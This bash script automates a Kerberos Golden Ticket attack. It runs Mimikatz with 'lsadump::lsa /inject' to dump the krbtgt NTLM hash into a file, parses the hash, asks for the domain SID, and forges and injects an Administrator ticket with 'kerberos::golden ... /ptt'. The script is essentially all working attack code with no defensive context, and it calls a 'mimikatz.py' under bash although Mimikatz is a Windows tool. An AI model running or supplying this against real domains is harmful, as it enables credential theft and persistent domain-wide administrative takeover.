#!/bin/bash

# Check if Mimikatz is present
if ! [ -x "$(command -v mimikatz.py)" ]; then
  echo "Error: Mimikatz is not installed." >&2
  exit 1
fi

# Function to display usage
usage() {
    echo "Syntax: $0 <DOMAIN_NAME> <KRBTGT_USER> <DC_NAME> <OUTPUT_DIR>"
    echo "Example: $0 yourdomain.com krbtgt yourDCname /path/to/output"
    exit 1
}

# Ensure the script is run as root
if [ "$(id -u)" -ne 0 ]; then
    echo "Please run as root"
    exit 1
fi

# Check if correct number of arguments are supplied
if [ $# -ne 4 ]; then
    echo "Error: Incorrect number of arguments supplied."
    usage
fi

# Define variables from arguments
DOMAIN_NAME=$1
KRBTGT_USER=$2
DC_NAME=$3
OUTPUT_DIR=$4

# Check if output directory exists
if [ ! -d "$OUTPUT_DIR" ]; then
  echo "Error: Output directory does not exist." >&2
  exit 1
fi

# Extract krbtgt hash (requires administrative privileges)
echo "Extracting krbtgt hash..."
/usr/local/bin/mimikatz.py "privilege::debug" "lsadump::lsa /inject /name:$KRBTGT_USER" > "$OUTPUT_DIR/krbtgt_hash.txt"

# Check if hash extraction was successful
if [ ! -s "$OUTPUT_DIR/krbtgt_hash.txt" ]; then
  echo "Error: Failed to extract krbtgt hash." >&2
  exit 1
fi

# Extract necessary values from the output file
# This part depends on the output format of Mimikatz and may need adjustment
echo "Parsing krbtgt hash..."
KRBTGT_HASH=$(grep -oP 'Hash NTLM: \K.*' "$OUTPUT_DIR/krbtgt_hash.txt")

if [ -z "$KRBTGT_HASH" ]; then
  echo "Error: Unable to parse krbtgt hash." >&2
  exit 1
fi

# Prompt for DOMAIN SID
read -rp "Enter the DOMAIN SID: " DOMAIN_SID

# Create a Golden Ticket
echo "Creating a Golden Ticket..."
/usr/local/bin/mimikatz.py "kerberos::golden /user:Administrator /domain:$DOMAIN_NAME /sid:$DOMAIN_SID /krbtgt:$KRBTGT_HASH /id:500 /ptt"

echo "Golden Ticket has been created and loaded into memory."